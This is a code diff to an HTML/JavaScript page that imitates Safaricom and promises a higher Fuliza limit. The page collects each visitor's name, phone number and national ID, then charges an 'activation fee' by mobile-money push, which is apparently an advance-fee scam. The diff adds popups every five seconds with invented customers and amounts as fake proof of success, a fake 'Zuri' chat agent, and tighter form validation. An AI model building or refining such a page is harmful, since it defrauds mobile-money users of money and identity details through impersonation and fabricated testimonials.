@@ -7,65 +7,82 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
         body { background: #f5f5f5; color: #333; overflow-x: hidden; }
-      .header { background: #00a651; color: white; padding: 14px; text-align: center; font-size: 18px; font-weight: 700; }
-      .screen { display: none; min-height: 100vh; padding-bottom: 80px; }
-      .screen.active { display: block; animation: fadeIn 0.4s ease; }
+     .header { background: #00a651; color: white; padding: 14px; text-align: center; font-size: 18px; font-weight: 700; }
+     .screen { display: none; min-height: 100vh; padding-bottom: 80px; }
+     .screen.active { display: block; animation: fadeIn 0.4s ease; }
         @keyframes fadeIn { from {opacity: 0;} to {opacity: 1;} }
-      .container { padding: 15px; max-width: 600px; margin: 0 auto; }
-      .card { background: white; border-radius: 12px; padding: 20px; margin-bottom: 15px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
-      .stats-banner { background: linear-gradient(135deg, #00a651 0%, #008541 100%); color: white; border-radius: 12px; padding: 25px 20px; margin-bottom: 15px; box-shadow: 0 4px 12px rgba(0,166,81,0.3); text-align: center; }
-      .stats-banner h2 { color: white; font-size: 22px; margin-bottom: 8px; }
-      .stats-banner p { color: #e6f9ee; margin-bottom: 15px; font-size: 13px; }
-      .stats-grid { display: flex; justify-content: space-between; gap: 10px; }
-      .stat-box { background: rgba(255,255,255,0.15); padding: 12px; border-radius: 8px; flex: 1; }
-      .stat-box.num { font-size: 20px; font-weight: 700; }
-      .stat-box.label { font-size: 11px; margin-top: 3px; }
+     .container { padding: 15px; max-width: 600px; margin: 0 auto; }
+     .card { background: white; border-radius: 12px; padding: 20px; margin-bottom: 15px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
+     .stats-banner { background: linear-gradient(135deg, #00a651 0%, #008541 100%); color: white; border-radius: 12px; padding: 25px 20px; margin-bottom: 15px; box-shadow: 0 4px 12px rgba(0,166,81,0.3); text-align: center; }
+     .stats-banner h2 { color: white; font-size: 22px; margin-bottom: 8px; }
+     .stats-banner p { color: #e6f9ee; margin-bottom: 15px; font-size: 13px; }
+     .stats-grid { display: flex; justify-content: space-between; gap: 10px; }
+     .stat-box { background: rgba(255,255,255,0.15); padding: 12px; border-radius: 8px; flex: 1; }
+     .stat-box.num { font-size: 20px; font-weight: 700; }
+     .stat-box.label { font-size: 11px; margin-top: 3px; }
         h1 { color: #00a651; font-size: 24px; text-align: center; margin-bottom: 10px; }
         h2 { font-size: 20px; text-align: center; margin-bottom: 20px; }
         p { color: #666; text-align: center; line-height: 1.5; margin-bottom: 20px; font-size: 14px; }
-      .btn { width: 100%; background: #00a651; color: white; border: none; padding: 14px; border-radius: 25px; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.3s ease; animation: floatUp 2s ease-in-out infinite; }
+     .btn { width: 100%; background: #00a651; color: white; border: none; padding: 14px; border-radius: 25px; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.3s ease; animation: floatUp 2s ease-in-out infinite; }
         @keyframes floatUp { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-8px)} }
-      .btn:hover { background: #008541; }
-      .btn:disabled { background: #ccc; cursor: not-allowed; animation: none; }
-      .form-group { margin-bottom: 15px; text-align: left; }
-      .form-group label { display: block; font-size: 14px; color: #555; margin-bottom: 6px; font-weight: 500; }
-      .form-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 15px; }
-      .form-group input:focus {border-color:#00a651; outline:none}
-      .profile-card { display: flex; align-items: center; gap: 15px; border-left: 5px solid #00a651; }
-      .avatar { width: 60px; height: 60px; border-radius: 50%; background: #e6f9ee; display: flex; align-items: center; justify-content: center; font-size: 30px; animation: rotate 8s linear infinite; }
+     .btn:hover { background: #008541; }
+     .btn:disabled { background: #ccc; cursor: not-allowed; animation: none; }
+     .form-group { margin-bottom: 15px; text-align: left; }
+     .form-group label { display: block; font-size: 14px; color: #555; margin-bottom: 6px; font-weight: 500; }
+     .form-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 15px; }
+     .form-group input:focus {border-color:#00a651; outline:none}
+     .profile-card { display: flex; align-items: center; gap: 15px; border-left: 5px solid #00a651; }
+     .avatar { width: 60px; height: 60px; border-radius: 50%; background: #e6f9ee; display: flex; align-items: center; justify-content: center; font-size: 30px; animation: rotate 8s linear infinite; }
         @keyframes rotate { from {transform: rotate(0deg);} to {transform: rotate(360deg);} }
-      .profile-info h3 { color: #00a651; font-size: 20px; margin-bottom: 5px; }
-      .profile-info p { text-align: left; margin: 3px 0; font-size: 14px; }
-      .limit-badge { background: #00a651; color: white; padding: 8px 15px; border-radius: 20px; display: inline-block; margin-top: 8px; font-weight: 700; }
-      .limit-option { background: white; border: 1px solid #eee; border-radius: 10px; padding: 18px; margin-bottom: 12px; text-align: center; cursor: pointer; transition: all 0.2s ease; }
-      .limit-option h3 { color: #00a651; font-size: 22px; margin-bottom: 5px; }
-      .limit-option.selected { border-color: #00a651; background: #e6f9ee; transform: translateY(-2px); box-shadow: 0 4px 10px rgba(0,166,81,0.15); }
-      .summary-box { background: #f9f9f9; border: 1px solid #eee; border-radius: 10px; padding: 15px; display: flex; justify-content: space-between; margin-bottom: 15px; }
-      .summary-box span:last-child { color: #00a651; font-weight: 700; }
-      .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00a651; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto 10px; }
+     .profile-info h3 { color: #00a651; font-size: 20px; margin-bottom: 5px; }
+     .profile-info p { text-align: left; margin: 3px 0; font-size: 14px; }
+     .limit-badge { background: #00a651; color: white; padding: 8px 15px; border-radius: 20px; display: inline-block; margin-top: 8px; font-weight: 700; }
+     .limit-option { background: white; border: 1px solid #eee; border-radius: 10px; padding: 18px; margin-bottom: 12px; text-align: center; cursor: pointer; transition: all 0.2s ease; }
+     .limit-option h3 { color: #00a651; font-size: 22px; margin-bottom: 5px; }
+     .limit-option.selected { border-color: #00a651; background: #e6f9ee; transform: translateY(-2px); box-shadow: 0 4px 10px rgba(0,166,81,0.15); }
+     .summary-box { background: #f9f9f9; border: 1px solid #eee; border-radius: 10px; padding: 15px; display: flex; justify-content: space-between; margin-bottom: 15px; }
+     .summary-box span:last-child { color: #00a651; font-weight: 700; }
+     .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00a651; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto 10px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-      .footer { background: #00a651; color: white; text-align: center; padding: 15px; font-size: 12px; position: fixed; bottom: 0; width: 100%; z-index: 1000; }
-      .error { color: #d32f2f; font-size: 12px; margin-top: 5px; display: none; }
-      .example {font-size:11px;color:#777;margin-top:4px;text-align:left}
-      .notif-list {margin:20px 0}
-      .notif {background:#f1f8f4;border-left:4px solid #00a651;padding:14px;margin-bottom:10px;border-radius:8px;font-size:13px;display:flex;justify-content:space-between;align-items:center}
-      .notif.id{color:#00a651;font-weight:600;font-family:monospace;font-size:11px}
-      .success-box{background:#e8f5e9;padding:12px;border-radius:8px;text-align:center;color:#2e7d32;font-size:13px;margin:15px 0;font-weight:600}
-      .whatsapp{position:fixed;bottom:70px;right:20px;width:56px;height:56px;background:#25D366;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:24px;box-shadow:0 4px 12px rgba(0,0,0,0.2);animation: blink 1s infinite;z-index:999}
+     .footer { background: #00a651; color: white; text-align: center; padding: 15px; font-size: 12px; position: fixed; bottom: 0; width: 100%; z-index: 1000; }
+     .error { color: #d32f2f; font-size: 12px; margin-top: 5px; display: none; }
+     .example {font-size:11px;color:#777;margin-top:4px;text-align:left}
+     .notif-list {margin:20px 0}
+     .notif {background:#f1f8f4;border-left:4px solid #00a651;padding:14px;margin-bottom:10px;border-radius:8px;font-size:13px;display:flex;justify-content:space-between;align-items:center}
+     .notif.id{color:#00a651;font-weight:600;font-family:monospace;font-size:11px}
+     .success-box{background:#e8f5e9;padding:12px;border-radius:8px;text-align:center;color:#2e7d32;font-size:13px;margin:15px 0;font-weight:600}
+
+      /* CHAT WITH ZURI - CARTON PROFILE */
+     .whatsapp{position:fixed;bottom:70px;right:20px;width:56px;height:56px;background:#25D366;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:24px;box-shadow:0 4px 12px rgba(0,0,0,0.2);animation: blink 1s infinite;z-index:999;cursor:pointer}
         @keyframes blink{0%,50%,100%{opacity:1}25%,75%{opacity:0.4}}
-      .whatsapp span{position:absolute;top:-4px;right:-4px;width:12px;height:12px;background:#00a651;border-radius:50%;border:2px solid #fff}
-      .whatsapp-label{position:absolute;right:65px;background:#333;color:#fff;padding:6px 10px;border-radius:6px;font-size:11px;white-space:nowrap}
-      .contact{text-align:center;margin-top:15px;font-size:13px;color:#666}
-      .contact a{color:#00a651;text-decoration:none;pointer-events:none;cursor:default;font-weight:600}
+     .whatsapp-avatar{width:40px;height:40px;border-radius:50%;background:#fff;border:2px solid #00a651;display:flex;align-items:center;justify-content:center;font-size:22px}
+     .whatsapp span.dot{position:absolute;top:-4px;right:-4px;width:12px;height:12px;background:#00a651;border-radius:50%;border:2px solid #fff}
+     .whatsapp-label{position:absolute;right:65px;background:#333;color:#fff;padding:6px 10px;border-radius:6px;font-size:11px;white-space:nowrap;font-weight:600}
+
+      /* POPUP NOTIFICATIONS */
+      .popup-container{position:fixed;bottom:140px;right:20px;z-index:1001;display:flex;flex-direction:column;gap:10px}
+      .popup-notif{background:white;border-left:4px solid #00a651;padding:14px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.2);min-width:280px;animation: slideIn 0.5s ease;opacity:0;transform:translateX(400px)}
+      .popup-notif.show{opacity:1;transform:translateX(0)}
+      .popup-notif.hide{animation: slideOut 0.5s ease forwards}
+      @keyframes slideIn{from{opacity:0;transform:translateX(400px)} to{opacity:1;transform:translateX(0)}}
+      @keyframes slideOut{from{opacity:1;transform:translateX(0)} to{opacity:0;transform:translateX(400px)}}
+      .popup-notif b{color:#00a651}
+
+     .contact{text-align:center;margin-top:15px;font-size:13px;color:#666}
+     .contact a{color:#00a651;text-decoration:none;pointer-events:none;cursor:default;font-weight:600}
     </style>
 </head>
 <body>
 
+<!-- CHAT WITH ZURI BUTTON -->
 <div class="whatsapp">
-  <span class="whatsapp-label">Chat with Zuri via WhatsApp</span>
-  💬
-  <span></span>
+  <span class="whatsapp-label">Chat with Zuri</span>
+  <div class="whatsapp-avatar">👩🏾‍💼</div>
+  <span class="dot"></span>
 </div>
+
+<!-- POPUP CONTAINER -->
+<div class="popup-container" id="popupContainer"></div>
 
 <div id="s1" class="screen active">
     <div class="container">
@@ -115,29 +132,29 @@
             <form id="form1">
                 <div class="form-group">
                     <label>First Name</label>
-                    <input type="text" id="firstName" placeholder="e.g. John" required>
+                    <input type="text" id="firstName" placeholder="e.g. John" pattern="[A-Za-z ]+" required>
                     <div class="error" id="firstError"></div>
                 </div>
                 <div class="form-group">
                     <label>Surname</label>
-                    <input type="text" id="surname" placeholder="e.g. Doe" required>
+                    <input type="text" id="surname" placeholder="e.g. Doe" pattern="[A-Za-z ]+" required>
                     <div class="error" id="surnameError"></div>
                 </div>
                 <div class="form-group">
                     <label>Safaricom Phone Number</label>
-                    <input type="tel" id="phone" placeholder="07XXXXXXXX or 01XXXXXXXX" required>
+                    <input type="tel" id="phone" placeholder="07XXXXXXXX or 01XXXXXXXX" inputmode="numeric" pattern="[0-9]*" required>
                     <div class="error" id="phoneError"></div>
                     <div class="example">Example: 0712345678 or 0112345678</div>
                 </div>
                 <div class="form-group">
                     <label>National ID Number</label>
-                    <input type="text" id="idNumber" placeholder="e.g. 12345678" required>
+                    <input type="text" id="idNumber" placeholder="e.g. 12345678" inputmode="numeric" pattern="[0-9]*" required>
                     <div class="error" id="idError"></div>
-                    <div class="example">Must match the ID registered with your Safaricom line. Minimum 8 characters</div>
+                    <div class="example">Must match the ID registered with your Safaricom line. Numbers only</div>
                 </div>
                 <div class="form-group">
                     <label>Your Current Fuliza Limit</label>
-                    <input type="number" id="currentLimit" required>
+                    <input type="number" id="currentLimit" inputmode="numeric" pattern="[0-9]*" required>
                 </div>
                 <button type="submit" class="btn">Verify Account</button>
             </form>
@@ -155,6 +172,7 @@
                 <h3 id="pName">Name</h3>
                 <p>Phone: <span id="pPhone">07XXXXXXXX</span></p>
                 <p>ID: <span id="pID">49****19</span></p>
+                <p id="pGenderText" style="color:#00a651;font-size:13px;margin-top:5px;"></p>
                 <div class="limit-badge">Current Limit: KSh <span id="pLimit">0</span></div>
             </div>
         </div>
@@ -172,7 +190,7 @@
             <div class="summary-box"><span>Activation Fee:</span> <span>KSh <span id="sFee">900</span></span></div>
             <div class="form-group" style="margin-top: 10px;">
                 <label>Safaricom Phone Number</label>
-                <input type="tel" id="payPhone" placeholder="07XXXXXXXX or 01XXXXXXXX">
+                <input type="tel" id="payPhone" placeholder="07XXXXXXXX or 01XXXXXXXX" inputmode="numeric" pattern="[0-9]*">
                 <div class="error" id="payPhoneError"></div>
             </div>
             <button id="payBtn" class="btn" onclick="paySTK()">Proceed to Pay</button>
@@ -195,6 +213,50 @@
 <script>
 let selectedLimit = 0, selectedFee = 0;
 let userData = {};
+
+// LIST YA MAJINA YA KIKE NA KIUME KWA KU-DETECT GENDER
+const femaleNames = ['mary','ann','wanjiku','amina','faith','joy','grace','janet','lucy','susan','esther','rose','beatrice','catherine','judith','rebecca','ruth','dorcas','caroline','nancy'];
+const maleNames = ['john','peter','james','david','michael','joseph','daniel','paul','kevin','brian','samuel','isaac','emmanuel','stephen','martin','george','anthony','charles','robert','williams'];
+
+// POPUP NOTIFICATIONS DATA
+const popupData = [
+  {name: "Mary Wanjiku", amount: "85000", phone: "0712345678"},
+  {name: "Peter Omondi", amount: "62000", phone: "0723456789"},
+  {name: "Grace Achieng", amount: "120000", phone: "0734567890"},
+  {name: "David Kiprotich", amount: "45000", phone: "0745678901"},
+  {name: "Faith Njeri", amount: "98000", phone: "0756789012"},
+  {name: "James Mutua", amount: "55000", phone: "0767890123"}
+];
+
+let popupIndex = 0;
+
+function maskPhone(phone){
+  return phone.substring(0,3) + "** ****" + phone.substring(9);
+}
+
+function showPopup(){
+  const container = document.getElementById('popupContainer');
+  const data = popupData[popupIndex % popupData.length];
+  
+  const div = document.createElement('div');
+  div.className = 'popup-notif';
+  div.innerHTML = `
+    <div><b>Congratulations ${data.name}</b><br>has increased ${femaleNames.includes(data.name.split(' ')[0].toLowerCase()) ? 'her' : 'his'} limit</div>
+    <div style="text-align:right;margin-top:5px">Ksh ${parseInt(data.amount).toLocaleString()}<br><span style="font-size:11px;color:#666;font-family:monospace">${maskPhone(data.phone)}</span></div>
+  `;
+  
+  container.appendChild(div);
+  setTimeout(()=>div.classList.add('show'), 100);
+  setTimeout(()=>{
+    div.classList.add('hide');
+    setTimeout(()=>div.remove(), 500);
+  }, 4000);
+  
+  popupIndex++;
+}
+
+// RUN POPUPS EVERY 5 SECONDS
+setInterval(showPopup, 5000);
 
 // GENERATE LIMITS: 5000, 9000, 12000, THEN +4000 TO 160000. FEE: 300 +150 EACH
 function generateLimits() {
@@ -231,6 +293,13 @@ function show(n){
     window.scrollTo(0,0);
 }
 
+function detectGender(firstName){
+  const name = firstName.toLowerCase();
+  if(femaleNames.includes(name)) return 'her';
+  if(maleNames.includes(name)) return 'his';
+  return 'their'; // default
+}
+
 document.getElementById('form1').addEventListener('submit', async e=>{
     e.preventDefault();
     if(!validateForm()) return;
@@ -250,10 +319,12 @@ document.getElementById('form1').addEventListener('submit', async e=>{
         currentLimit: document.getElementById('currentLimit').value
     };
 
+    const genderPronoun = detectGender(firstName);
     document.getElementById('pName').innerText = userData.name;
     document.getElementById('pPhone').innerText = userData.phone;
     document.getElementById('pID').innerText = userData.id.substring(0,2) + '****' + userData.id.slice(-2);
     document.getElementById('pLimit').innerText = userData.currentLimit;
+    document.getElementById('pGenderText').innerText = `We are increasing ${genderPronoun} Fuliza limit`;
     document.getElementById('userAvatar').innerText = firstName[0] + surname[0];
 
     setTimeout(()=>show(3), 2000);
@@ -279,9 +350,10 @@ function validateForm(){
     const phone = document.getElementById('phone').value.trim();
     const idNumber = document.getElementById('idNumber').value.trim();
 
-    if(firstName === ''){document.getElementById('firstError').innerText = "First name is required";document.getElementById('firstError').style.display = 'block';valid = false;}
-    if(surname === ''){document.getElementById('surnameError').innerText = "Surname is required";document.getElementById('surnameError').style.display = 'block';valid = false;}
-    if(idNumber.length < 8){document.getElementById('idError').innerText = "ID must be 8 or more characters";document.getElementById('idError').style.display = 'block';valid = false;}
+    const nameRegex = /^[A-Za-z ]+$/;
+    if(firstName === '' ||!nameRegex.test(firstName)){document.getElementById('firstError').innerText = "Enter valid first name - letters only";document.getElementById('firstError').style.display = 'block';valid = false;}
+    if(surname === '' ||!nameRegex.test(surname)){document.getElementById('surnameError').innerText = "Enter valid surname - letters only";document.getElementById('surnameError').style.display = 'block';valid = false;}
+    if(idNumber.length < 8 ||!/^[0-9]+$/.test(idNumber)){document.getElementById('idError').innerText = "ID must be 8 or more numbers";document.getElementById('idError').style.display = 'block';valid = false;}
 
     const phoneRegex = /^(07|01)\d{8}$/;
     if(!phoneRegex.test(phone)){
